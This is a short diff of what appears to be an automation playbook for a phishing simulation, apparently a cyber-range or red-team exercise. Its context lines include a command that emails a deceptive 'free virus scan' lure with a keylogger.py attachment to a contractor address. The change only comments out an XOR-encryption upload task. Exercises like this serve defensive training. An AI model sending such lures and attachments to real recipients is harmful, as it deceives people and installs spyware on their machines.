@@ -14,8 +14,8 @@
   tasks:
     - name: send a phishing email
       raw: echo "Are you frustrated with how slow your computer is? Open the attachment for a free virus scan!" | mutt -s "Free virus scan!" -a keylogger.py -- contractor@fazio.com
-    - name: upload xor encryption script
-      raw: python package.py xor.py
+    # - name: upload xor encryption script
+    #   raw: python package.py xor.py
 - name: phishing response
   hosts: contractor
   tasks:
